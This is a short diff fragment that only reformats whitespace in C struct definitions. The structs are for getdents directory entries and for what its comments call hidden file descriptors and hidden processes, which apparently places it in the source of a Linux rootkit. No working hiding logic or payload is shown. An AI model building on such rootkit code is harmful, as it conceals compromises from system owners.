@@ -11,17 +11,17 @@
 
 /* struct for getdents entries */
 struct linux_dirent {
-	unsigned long  d_ino;
-	unsigned long  d_off;
+	unsigned long d_ino;
+	unsigned long d_off;
 	unsigned short d_reclen;
-	char           d_name[];
+	char d_name[];
 };
 
 /* struct for hidden file descriptors */
 struct fd_node {
-	struct  fdtable *table;
-	struct  file *file;
-	int 	fd;
+	struct fdtable *table;
+	struct file *file;
+	int fd;
 };
 
 /* struct for hidden prcesses */
